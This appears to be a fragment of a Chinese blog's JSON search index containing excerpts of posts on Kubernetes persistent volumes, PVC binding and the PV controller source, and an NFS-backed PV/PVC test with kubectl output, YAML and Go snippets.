https://github.com/kubernetes/enhancements/tree/master/keps/sig-storage/531-online-pv-resizing pvc状态为pending 可能是nfs没有挂载成功，检查nfs挂载 [root@node61 wangb]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-claim Pending managed-nfs-storage 12m ---- ------ ---- ---- ------- Normal Provisioning 7m49s k8s-sigs.io/nfs-subdir-external-provisioner_nfs-client-provisioner-59b4c555d6-gl8pw_494f3aed-c583-4819-8af0-3fd2de70307f External provisioner is provisioning volume for claim \"default/test-claim\" Normal ExternalProvisioning 108s (x26 over 7m49s) persistentvolume-controller waiting for a volume to be created, either by external pro","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:13:4","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"PV和PVC的概念和设计原理","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"介绍K8S的PV和PVC概念和设计原理。 ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:0:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"k8s的PV和PVC概念 ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:1:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"卷 Container 中的文件在磁盘上是临时存放的，这给 Container 中运行的较重要的应用 程序带来一些问题。 问题之一是当容器崩溃时文件丢失。kubelet 会重新启动容器， 但容器会以干净的状态重启。 第二个问题会在同一 Pod 中运行多个容器并共享文件时出现。 Kubernetes 卷（Volume） 这一抽象概念能够解决这两个问题。 Kubernetes 支持很多类型的卷。 Pod 可以同时使用任意数目的卷类型。 临时卷类型的生命周期与 Pod 相同，但持久卷可以比 Pod 的存活期长。 因此，卷的存在时间会超出 Pod 中运行的所有容器，并且在容器重新启动时数据也会得到保留。 当 Pod 不再存在时，卷也将不再存在。 卷的核心是包含一些数据的一个目录，Pod 中的容器可以访问该目录。 所采用的特定的卷类型将决定该目录如何形成的、使用何种介质保存数据以及目录中存放 的内容。 configMap configMap 卷 提供了向 Pod 注入配置数据的方法。 ConfigMap 对象中存储的数据可以被 configMap 类型的卷引用，然后被 Pod 中运行的 容器化应用使用。 引用 configMap 对象时，你可以在 volume 中通过它的名称来引用。 你可以自定义 ConfigMap 中特定条目所要使用的路径。 下面的配置显示了如何将名为 log-config 的 ConfigMap 挂载到名为 configmap-pod 的 Pod 中： apiVersion:v1kind:Podmetadata:name:configmap-podspec:containers:- name:testimage:busyboxvolumeMounts:- name:config-volmountPath:/etc/configvolumes:- name:config-volconfigMap:name:log-configitems:- key:log_levelpath:log_level log-config ConfigMap 以卷的形式挂载，并且存储在 log_level 条目中的所有内容 都被挂载到 Pod 的 /etc/config/log_level 路径下。 请注意，这个路径来源于卷的 mountPath 和 log_level 键对应的 path。 说明： 在使用 ConfigMap 之前你首先要创建它。 容器以 subPath 卷挂载方式使用 ConfigMap 时，将无法接收 ConfigMap 的更新。 文本数据挂载成文件时采用 UTF-8 字符编码。如果使用其他字符编码形式，可使用 binaryData 字段。 emptyDir 当 Pod 分派到某个 Node 上时，emptyDir 卷会被创建，并且在 Pod 在该节点上运行期间，卷一直存在。 就像其名称表示的那样，卷最初是空的。 尽管 Pod 中的容器挂载 emptyDir 卷的路径可能相同也可能不同，这些容器都可以读写 emptyDir 卷中相同的文件。 当 Pod 因为某些原因被从节点上删除时，emptyDir 卷中的数据也会被永久删除。 说明： 容器崩溃并不会导致 Pod 被从节点上移除，因此容器崩溃期间 emptyDir 卷中的数据是安全的。 emptyDir 的一些用途： 缓存空间，例如基于磁盘的归并排序。 为耗时较长的计算任务提供检查点，以便任务能方便地从崩溃前状态恢复执行。 在 Web 服务器容器服务数据时，保存内容管理器容器获取的文件。 hostPath hostPath 卷能将主机节点文件系统上的文件或目录挂载到你的 Pod 中。 虽然这不是大多数 Pod 需要的，但是它为一些应用程序提供了强大的逃生舱。 例如，hostPath 的一些用法有： 运行一个需要访问 Docker 内部机制的容器；可使用 hostPath 挂载 /var/lib/docker 路径。 在容器中运行 cAdvisor 时，以 hostPath 方式挂载 /sys。 允许 Pod 指定给定的 hostPath 在运行 Pod 之前是否应该存在，是否应该创建以及应该以什么方式存在。 除了必需的 path 属性之外，用户可以选择性地为 hostPath 卷指定 type。 Secret secret 卷用来给 Pod 传递敏感信息，例如密码。你可以将 Secret 存储在 Kubernetes API 服务器上，然后以文件的形式挂在到 Pod 中，无需直接与 Kubernetes 耦合。 secret 卷由 tmpfs（基于 RAM 的文件系统）提供存储，因此它们永远不会被写入非易失性 （持久化的）存储器。 说明： 使用前你必须在 Kubernetes API 中创建 secret。 说明： 容器以 subPath 卷挂载方式挂载 Secret 时，将感知不到 Secret 的更新。 secret说明文档：https://kubernetes.io/zh/docs/concepts/configuration/secret/ nfs nfs 卷能将 NFS (网络文件系统) 挂载到你的 Pod 中。 不像 emptyDir 那样会在删除 Pod 的同时也会被删除，nfs 卷的内容在删除 Pod 时会被保存，卷只是被卸载。 这意味着 nfs 卷可以被预先填充数据，并且这些数据可以在 Pod 之间共享。 注意： 在使用 NFS 卷之前，你必须运行自己的 NFS 服务，并将目标 share 导出备用。 nfs示例 persistentVolumeClaim persistentVolumeClaim 卷用来将持久卷（PersistentVolume） 挂载到 Pod 中。 持久卷声明（PersistentVolumeClaim）是用户在不知道特定云环境细节的情况下\"声明\"持久存储 （例如 GCE PersistentDisk 或者 iSCSI 卷）的一种方法。 更多详情请参考持久卷示例 ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:1:1","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"持久卷 persistent-volumes概念 存储的管理是一个与计算实例的管理完全不同的问题。PersistentVolume 子系统为用户 和管理员提供了一组 API，将存储如何供应的细节从其如何被使用中抽象出来。 为了实现这点，我们引入了两个新的 API 资源：PersistentVolume 和 PersistentVolumeClaim。 持久卷（PersistentVolume，PV）是集群中的一块存储，可以由管理员事先供应，或者 使用存储类（Storage Class）来动态供应。 持久卷是集群资源，就像节点也是集群资源一样。PV 持久卷和普通的 Volume 一样，也是使用 卷插件来实现的，只是它们拥有独立于任何使用 PV 的 Pod 的生命周期。 此 API 对象中记述了存储的实现细节，无论其背后是 NFS、iSCSI 还是特定于云平台的存储系统。 持久卷声明（PersistentVolumeClaim，PVC）表达的是用户对存储的请求。概念上与 Pod 类似。 Pod 会耗用节点资源，而 PVC 声明会耗用 PV 资源。Pod 可以请求特定数量的资源（CPU 和内存）；同样 PVC 声明也可以请求特定的大小和访问模式 （例如，可以要求 PV 卷能够以 ReadWriteOnce、ReadOnlyMany 或 ReadWriteMany 模式之一来挂载，参见访问模式）。 尽管 PersistentVolumeClaim 允许用户消耗抽象的存储资源，常见的情况是针对不同的 问题用户需要的是具有不同属性（如，性能）的 PersistentVolume 卷。 集群管理员需要能够提供不同性质的 PersistentVolume，并且这些 PV 卷之间的差别不 仅限于卷大小和访问模式，同时又不能将卷是如何实现的这些细节暴露给用户。 为了满足这类需求，就有了 存储类（StorageClass） 资源。 PV不属于任何命名空间, 它跟节点（node）一样是集群层面的资源，区别于pod和PVC。由系统管理员创建管理。 当集群用户需要在其pod中使用持久化存储时，他们首先创建PVC清单，指定所需要的最低容量要求和访问模式，然后用户将待久卷声明清单提交给Kubernetes API服务器，Kubernetes将找到可匹配的PV并将其绑定到PVC。PVC可以当作pod中的一个卷来使用，其他用户不能使用相同的PV，除非先通过删除PVC绑定来释放。 供应 PV 卷的供应有两种方式：静态供应或动态供应。 静态供应 集群管理员创建若干 PV 卷。这些卷对象带有真实存储的细节信息，并且对集群 用户可用（可见）。PV 卷对象存在于 Kubernetes API 中，可供用户消费（使用）。 动态供应 如果管理员所创建的所有静态 PV 卷都无法与用户的 PersistentVolumeClaim 匹配， 集群可以尝试为该 PVC 申领动态供应一个存储卷。 这一供应操作是基于 StorageClass 来实现的：PVC 申领必须请求某个 存储类，同时集群管理员必须 已经创建并配置了该类，这样动态供应卷的动作才会发生。 如果 PVC 申领指定存储类为 “\"，则相当于为自身禁止使用动态供应的卷。 为了基于存储类完成动态的存储供应，集群管理员需要在 API 服务器上启用 DefaultStorageClass 准入控制器。 举例而言，可以通过保证 DefaultStorageClass 出现在 API 服务器组件的 –enable-admission-plugins 标志值中实现这点；该标志的值可以是逗号 分隔的有序列表。关于 API 服务器标志的更多信息，可以参考 kube-apiserver 文档。 绑定 用户创建一个带有特定存储容量和特定访问模式需求的 PersistentVolumeClaim 对象； 在动态供应场景下，这个 PVC 对象可能已经创建完毕。 主控节点中的控制回路监测新的 PVC 对象，寻找与之匹配的 PV 卷（如果可能的话）， 并将二者绑定到一起。 如果为了新的 PVC 申领动态供应了 PV 卷，则控制回路总是将该 PV 卷绑定到这一 PVC 申领。 否则，用户总是能够获得他们所请求的资源，只是所获得的 PV 卷可能会超出所请求的配置。 一旦绑定关系建立，则 PersistentVolumeClaim 绑定就是排他性的，无论该 PVC 申领是 如何与 PV 卷建立的绑定关系。 PVC 申领与 PV 卷之间的绑定是一种一对一的映射，实现上使用 ClaimRef 来记述 PV 卷 与 PVC 申领间的双向绑定关系。 如果找不到匹配的 PV 卷，PVC 申领会无限期地处于未绑定状态（即pvc处于pending状态）。 当与之匹配的 PV 卷可用时，PVC 申领会被绑定。 例如，即使某集群上供应了很多 50 Gi 大小的 PV 卷，也无法与请求 100 Gi 大小的存储的 PVC 匹配。当新的 100 Gi PV 卷被加入到集群时，该 PVC 才有可能被绑定。 [root@node131 k8s_pv_pvc]# kubectl get pvc -A NAMESPACE NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE default nfs-pv-provisioning-demo Pending 7s [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl describe pvc nfs-pv-provisioning-demo Name: nfs-pv-provisioning-demo Namespace: default StorageClass: Status: Pending Volume: Labels: demo=nfs-pv-provisioning Annotations: \u003cnone\u003e Finalizers: [kubernetes.io/pvc-protection] Capacity: Access Modes: VolumeMode: Filesystem Used By: \u003cnone\u003e Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal FailedBinding 5s (x3 over 27s) persistentvolume-controller no persistent volumes available for this claim and no storage class is set [root@node131 k8s_pv_pvc]# 使用 Pod 将 PVC 申领当做存储卷来使用。集群会检视 PVC 申领，找到所绑定的卷，并 为 Pod 挂载该卷。对于支持多种访问模式的卷，用户要在 Pod 中以卷的形式使用申领 时指定期望的访问模式。 一旦用户有了申领对象并且该申领已经被绑定，则所绑定的 PV 卷在用户仍然需要它期间 一直属于该用户。用户通过在 Pod 的 volumes 块中包含 persistentVolumeClaim 节区来调度 Pod，访问所申领的 PV 卷。 相关细节可参阅使用申领作为卷。 保护使用中的存储对象 保护使用中的存储对象（Storage Object in Use Protection）这一功能特性的目的 是确保仍被 Pod 使用的 PersistentVolumeClaim（PVC）对象及其所绑定的 PersistentVolume（PV）对象在系统中不会被删除，因为这样做可能会引起数据丢失。 说明： 当使用某 PVC 的 Pod 对象仍然存在时，认为该 PVC 仍被此 Pod 使用。 如果用户删除被某 Pod 使用的 PVC 对象，该 PVC 申领不会被立即移除。 PVC 对象的移除会被推迟，直至其不再被任何 Pod 使用。 此外，如果管理员删除已绑定到某 PVC 申领的 PV 卷，该 PV 卷也不会被立即移除。 PV 对象的移除也要推迟到该 PV 不再绑定到 PVC。 你可以看到当 PVC 的状态为 Terminating 且其 Finalizers 列表中包含 kubernetes.io/pvc-protection 时，PVC 对象是处于被保护状态的。 每个 PV 对象都包含 spec 部分和 status 部分，分别对应卷的规约和状态。 PersistentVolume 对象的名称必须是合法的 DNS 子域名. PV说明 apiVersion:v1kind:PersistentVolumemetadata:name:pv0003spec:capacity:storage:5GivolumeMode:FilesystemaccessModes:- ReadWriteOncepersistentVolumeReclaimPolicy:RecyclestorageClassName:slowmountOptions:- hard- nfsvers=4.1nfs:path:/tmpserver:192.168.182.131 说明： 在集群中使用持久卷存储通常需要一些特定于具体卷类型的辅助程序。 在这个例子中，PersistentVolume 是 NFS 类型的，因此需要辅助程序 /sbin/mount.nfs 来支持挂载 NFS 文件系统。 容量 一","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:1:2","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"PV和PVC设计目标 Kubernetes makes no guarantees at runtime that the underlying storage exists or is available. High availability is left to the storage provider. Goals Allow administrators to describe available storage.（通过pv来定义存储资源） Allow pod authors to discover and request persistent volumes to use with pods.（允许pod使用像使用pod的request资源一样使用存储pv） Enforce security through access control lists and securing storage to the same namespace as the pod volume.（通过访问控制列表机制来保证存储使用安全） Enforce quotas through admission control.（通过准入机制实现存储配额） Enforce scheduler rules by resource counting.（基于资源数量调度，调度pvc-\u003epv） Ensure developers can rely on storage being available without being closely bound to a particular disk, server, network, or storage device.(通过抽象层设计，pod与具体的存储资源隔离) ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:2:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"PersistentVolumeController分析 ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:3:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"实例化 volume manager controller 来管理persistentvolume kubernetes\\pkg\\controller\\volume\\persistentvolume\\ // NewController creates a new PersistentVolume controller controller := \u0026PersistentVolumeController{ volumes: newPersistentVolumeOrderedIndex(), claims: cache.NewStore(cache.DeletionHandlingMetaNamespaceKeyFunc), kubeClient: p.KubeClient, eventRecorder: eventRecorder, runningOperations: goroutinemap.NewGoRoutineMap(true /* exponentialBackOffOnError */), cloud: p.Cloud, enableDynamicProvisioning: p.EnableDynamicProvisioning, clusterName: p.ClusterName, createProvisionedPVRetryCount: createProvisionedPVRetryCount, createProvisionedPVInterval: createProvisionedPVInterval, claimQueue: workqueue.NewNamed(\"claims\"), volumeQueue: workqueue.NewNamed(\"volumes\"), resyncPeriod: p.SyncPeriod, operationTimestamps: metrics.NewOperationStartTimeCache(), } ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:3:1","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"pv cache 构造 newPersistentVolumeOrderedIndex -\u003e persistentVolumeOrderedIndex pv在cache中按AccessModes索引，并按存储量大小排序 // persistentVolumeOrderedIndex is a cache.Store that keeps persistent volumes // indexed by AccessModes and ordered by storage capacity. type persistentVolumeOrderedIndex struct { store cache.Indexer } func newPersistentVolumeOrderedIndex() persistentVolumeOrderedIndex { return persistentVolumeOrderedIndex{cache.NewIndexer(cache.MetaNamespaceKeyFunc, cache.Indexers{\"accessmodes\": accessModesIndexFunc})} } 进行pv的同步操作 如果 volume.Spec.ClaimRef == nil 说明pv没有被pvc绑定使用，直接更新pv：ctrl.updateVolumePhase(volume, v1.VolumeAvailable, “\") volume.Spec.ClaimRef != nil 说明pv被pvc绑定使用，需要进行相应逻辑处理 说明：pvc和 pv 是通过UID来进行关联标识：claim.UID != volume.Spec.ClaimRef.UID ? // syncVolume is the main controller method to decide what to do with a volume. // It's invoked by appropriate cache.Controller callbacks when a volume is // created, updated or periodically synced. We do not differentiate between // these events. func (ctrl *PersistentVolumeController) syncVolume(volume *v1.PersistentVolume) error { } ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:3:2","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"为pvc匹配查找最佳pv 根据声明的pvc，在pv列表中匹配查找 先按pvc要求的AccessModes，过滤出符合要求的pv候选列表 在pv候选列表中优选出最佳的pv // findBestMatchForClaim is a convenience method that finds a volume by the claim's AccessModes and requests for Storage func (pvIndex *persistentVolumeOrderedIndex) findBestMatchForClaim(claim *v1.PersistentVolumeClaim, delayBinding bool) (*v1.PersistentVolume, error) { return pvIndex.findByClaim(claim, delayBinding) } // find returns the nearest PV from the ordered list or nil if a match is not found func (pvIndex *persistentVolumeOrderedIndex) findByClaim(claim *v1.PersistentVolumeClaim, delayBinding bool) (*v1.PersistentVolume, error) { // PVs are indexed by their access modes to allow easier searching. Each // index is the string representation of a set of access modes. There is a // finite number of possible sets and PVs will only be indexed in one of // them (whichever index matches the PV's modes). // // A request for resources will always specify its desired access modes. // Any matching PV must have at least that number of access modes, but it // can have more. For example, a user asks for ReadWriteOnce but a GCEPD // is available, which is ReadWriteOnce+ReadOnlyMany. // // Searches are performed against a set of access modes, so we can attempt // not only the exact matching modes but also potential matches (the GCEPD // example above). allPossibleModes := pvIndex.allPossibleMatchingAccessModes(claim.Spec.AccessModes) for _, modes := range allPossibleModes { volumes, err := pvIndex.listByAccessModes(modes) if err != nil { return nil, err } bestVol, err := pvutil.FindMatchingVolume(claim, volumes, nil /* node for topology binding*/, nil /* exclusion map */, delayBinding) if err != nil { return nil, err } if bestVol != nil { return bestVol, nil } } return nil, nil } 优选算法函数如下，该函数会被PV controller 和 scheduler 使用 参数delayBinding 只在PV controller流程为true 参数node和excludedVolumes 只在scheduler流程设置 // FindMatchingVolume goes through the list of volumes to find the best matching volume // for the claim. // // This function is used by both the PV controller and scheduler. // // delayBinding is true only in the PV controller path. When set, prebound PVs are still returned // as a match for the claim, but unbound PVs are skipped. // // node is set only in the scheduler path. When set, the PV node affinity is checked against // the node's labels. // // excludedVolumes is only used in the scheduler path, and is needed for evaluating multiple // unbound PVCs for a single Pod at one time. As each PVC finds a matching PV, the chosen // PV needs to be excluded from future matching. func FindMatchingVolume( claim *v1.PersistentVolumeClaim, volumes []*v1.PersistentVolume, node *v1.Node, excludedVolumes map[string]*v1.PersistentVolume, delayBinding bool) (*v1.PersistentVolume, error) { } ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:3:3","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Matching and binding PVC-\u003ePV PersistentVolumeClaimBinder尝试查找与用户请求最接近的可用卷。如果存在，则通过将pv上的引用绑定到pvc。如果找不到合适的匹配，请求可能无法满足。 claim(PVC)必须请求访问模式和存储容量。这是因为内部PV是按其AccessModes索引的，目标PV在某种程度上是按其容量排序的。pvc声明可以请求以下多个属性中的一个来更好地匹配PV：卷名称、选择器和卷类(当前实现为注释)。 PV可以定义一个ClaimRef，它会对PVC的匹配产生很大的影响(但不是绝对的保证)。PV还可以定义标签、注释和卷类(当前作为注释实现)以更好地针对目标PVC。 PVC-\u003ePV匹配算法说明： As of Kubernetes version 1.4, the following algorithm describes in more details how a claim is matched to a PV: Only PVs with accessModes equal to or greater than the claim’s requested accessModes are considered. “Greater” here means that the PV has defined more modes than needed by the claim, but it also defines the mode requested by the claim. The potential PVs above are considered in order of the closest access mode match, with the best case being an exact match, and a worse case being more modes than requested by the claim. Each PV above is processed. If the PV has a claimRef matching the claim, and the PV’s capacity is not less than the storage being requested by the claim then this PV will bind to the claim. Done. Otherwise, if the PV has the “volume.alpha.kubernetes.io/storage-class” annotation defined then it is skipped and will be handled by Dynamic Provisioning. Otherwise, if the PV has a claimRef defined, which can specify a different claim or simply be a placeholder, then the PV is skipped. 这点说明了 PV和PVC之间的关系是1对1 Otherwise, if the claim is using a selector but it does not match the PV’s labels (if any) then the PV is skipped. But, even if a claim has selectors which match a PV that does not guarantee a match since capacities may differ. Otherwise, if the PV’s “volume.beta.kubernetes.io/storage-class” annotation (which is a placeholder for a volume class) does not match the claim’s annotation (same placeholder) then the PV is skipped. If the annotations for the PV and PVC are empty they are treated as being equal. Otherwise, what remains is a list of PVs that may match the claim. Within this list of remaining PVs, the PV with the smallest capacity that is also equal to or greater than the claim’s requested storage is the matching PV and will be bound to the claim. Done. In the case of two or more PVCs matching all of the above criteria, the first PV (remember the PV order is based on accessModes) is the winner. 候选PV列表中最小资源满足的PV为最佳优选结果 Note: if no PV matches the claim and the claim defines a StorageClass (or a default StorageClass has been defined) then a volume will be dynamically provisioned. ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:4:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"测试NFS-PV-PVC 下面的示例演示如何从单个nfs server的POD RC控制器导出NFS共享，并将其导入web的两个RC控制器。 ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:5:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"nfs server # Copyright 2016 The Kubernetes Authors.## Licensed under the Apache License, Version 2.0 (the \"License\");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an \"AS IS\" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.FROMcentosRUN yum -y install /usr/bin/ps nfs-utils \u0026\u0026 yum clean allRUN mkdir -p /exportsADD run_nfs.sh /usr/local/bin/ADD index.html /tmp/index.htmlRUN chmod 644 /tmp/index.html# expose mountd 20048/tcp and nfsd 2049/tcp and rpcbind 111/tcpEXPOSE2049/tcp 20048/tcp 111/tcp 111/udpENTRYPOINT [\"/usr/local/bin/run_nfs.sh\", \"/exports\"] # 制作镜像 docker build -t k8s.gcr.io/volume-nfs:0.8 . docker save k8s.gcr.io/volume-nfs:0.8 -o volume-nfs-img.tar # 在测试环境中导出镜像 docker load -i volume-nfs-img.tar ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:5:1","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"NFS server part 把nfs测试配置脚本文件examples/staging/volumes/nfs拷贝到测试环境中 修改下测试镜像名称：如busybox和nginx 按需要， 创建 gce-pv # If you are on GCE, create a GCE PD-based PVC: # kubectl create -f examples/staging/volumes/nfs/provisioner/nfs-server-gce-pv.yaml # kubectl create -f nfs/provisioner/nfs-server-gce-pv.yaml test pv和 pvc # test pv kubectl create -f nfs/test/pv0001.yaml # test pvc kubectl create -f nfs/test/pvc-pv0001.yaml 创建 NFS server and service #kubectl create -f examples/staging/volumes/nfs/nfs-server-rc.yaml #kubectl create -f examples/staging/volumes/nfs/nfs-server-service.yaml kubectl create -f nfs/custom-nfs-server-rc.yaml kubectl create -f nfs/nfs-server-service.yaml 说明创建pod时，其使用的pvc必须为bound状态才能进行调度 Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedScheduling 29s default-scheduler 0/1 nodes are available: 1 persistentvolumeclaim \"nfs-pv-provisioning-demo\" not found. Warning FailedScheduling 29s default-scheduler 0/1 nodes are available: 1 persistentvolumeclaim \"nfs-pv-provisioning-demo\" not found. 创建基于NFS的pv和pvc 检查下nfs-server kubectl describe services nfs-server nfs的服务端口 [root@node131 k8s_pv_pvc]# kubectl describe services nfs-server Name: nfs-server Namespace: default Labels: \u003cnone\u003e Annotations: \u003cnone\u003e Selector: role=nfs-server Type: ClusterIP IP Families: \u003cnone\u003e IP: 10.233.63.192 IPs: 10.233.63.192 Port: nfs 2049/TCP TargetPort: 2049/TCP Endpoints: 10.233.124.46:2049 Port: mountd 20048/TCP TargetPort: 20048/TCP Endpoints: 10.233.124.46:20048 Port: rpcbind 111/TCP TargetPort: 111/TCP Endpoints: 10.233.124.46:111 Session Affinity: None Events: \u003cnone\u003e 然后再创建nfs的pv和pvc #kubectl create -f examples/staging/volumes/nfs/nfs-pv.yaml #kubectl create -f examples/staging/volumes/nfs/nfs-pvc.yaml kubectl create -f nfs/custom-nfs-pv.yaml kubectl create -f nfs/custom-nfs-pvc.yaml [root@node131 k8s_pv_pvc]# kubectl create -f nfs/nfs-pv.yaml persistentvolume/nfs created [root@node131 k8s_pv_pvc]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE nfs 1Mi RWX Retain Available 6s [root@node131 k8s_pv_pvc]# kubectl describe pv nfs Name: nfs Labels: \u003cnone\u003e Annotations: \u003cnone\u003e Finalizers: [kubernetes.io/pv-protection] StorageClass: Status: Available Claim: Reclaim Policy: Retain Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u003cnone\u003e Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: nfs-server.default.svc.cluster.local Path: /tmp/data ReadOnly: false Events: \u003cnone\u003e [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl create -f nfs/nfs-pvc.yaml persistentvolumeclaim/nfs created [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE nfs 1Mi RWX Retain Bound default/nfs 114s [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Bound nfs 1Mi RWX 16s [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# 此时再查看pv和pvc的信息，能够看到注解信息有变化，状态为Status: Bound [root@node131 k8s_pv_pvc]# kubectl describe pv nfs Name: nfs Labels: \u003cnone\u003e Annotations: pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pv-protection] StorageClass: Status: Bound Claim: default/nfs Reclaim Policy: Retain Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u003cnone\u003e Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: nfs-server.default.svc.cluster.local Path: /tmp/data ReadOnly: false Events: \u003cnone\u003e [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl describe pvc nfs Name: nfs Namespace: default StorageClass: Status: Bound Volume: nfs Labels: \u003cnone\u003e Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: ye","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:5:2","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"测试的pv和pvc信息 [root@node131 ~]# kubectl describe pv Name: nfs Labels: \u003cnone\u003e Annotations: pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pv-protection] StorageClass: Status: Bound Claim: default/nfs Reclaim Policy: Retain Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u003cnone\u003e Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: 10.233.16.102 Path: /exports ReadOnly: false Events: \u003cnone\u003e [root@node131 ~]# [root@node131 ~]# [root@node131 ~]# kubectl describe pvc Name: nfs Namespace: default StorageClass: Status: Bound Volume: nfs Labels: 